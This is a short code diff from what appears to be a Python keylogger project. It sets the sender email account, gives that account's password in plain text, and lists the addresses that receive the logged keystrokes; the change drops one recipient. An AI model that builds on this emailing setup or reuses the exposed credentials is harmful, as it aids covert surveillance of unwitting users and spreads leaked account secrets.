@@ -13,7 +13,7 @@ word_count = 0
 sender = "keylogproject38@gmail.com"
 sender_pass = "gottaloveloggingthemkeys"
 
-email_receivers = ["keylogproject38@gmail.com", "arianibobi@gmail.com"]
+email_receivers = ["keylogproject38@gmail.com"]
 
 
 def on_click(x, y, button, pressed):
